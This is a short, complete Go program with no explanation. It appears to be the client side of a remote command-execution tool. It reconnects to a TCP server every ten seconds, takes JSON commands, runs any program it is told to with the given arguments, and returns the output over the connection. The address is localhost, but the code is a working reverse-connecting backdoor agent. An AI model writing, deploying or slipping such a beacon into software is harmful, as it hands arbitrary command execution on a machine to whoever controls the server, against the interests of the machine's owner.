package main

import (
	"bufio"
	"encoding/json"
	"io"
	"net"
	"os/exec"
	"time"
)

type SendJson struct {
	SendType    string
	CommandName string
	Params      []string
}

const version = "1.0"

func main() {
	for {
		run := ToServer()
		if run == false {
			return
		}
		time.Sleep(10 * time.Second)
	}
}
func ToServer() bool {
	conn, err := net.Dial("tcp", "127.0.0.1:10000")
	if err != nil {
		return true
	}
	defer conn.Close()
	r := bufio.NewReader(conn)
	for {
		data, err := r.ReadBytes('\n')
		if err != nil || io.EOF == err {
			break
		}
		receive := SendJson{}
		err = json.Unmarshal(data, &receive)
		if err != nil {
			continue
		}
		if receive.SendType == "111" {
			switch receive.CommandName {
			case "-v":
				conn.Write([]byte("client " + version + "\n"))
			case "-exit":
				return false
			default:
				execCommand(receive.CommandName, receive.Params, conn)
			}
		}
	}
	return true
}
func execCommand(commandName string, params []string, conn net.Conn) bool {
	cmd := exec.Command(commandName, params...)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return false
	}
	err = cmd.Start()
	if err != nil {
		conn.Write([]byte(err.Error() + "\n"))
		return false
	}
	reader := bufio.NewReader(stdout)
	lines := []byte{}
	lines = append(lines, []byte(conn.LocalAddr().String())...)
	for {
		line, err2 := reader.ReadBytes('\n')
		lines = append(lines, line...)
		if err2 != nil || io.EOF == err2 {
			break
		}
	}
	conn.Write(lines)
	cmd.Wait()
	return true
}
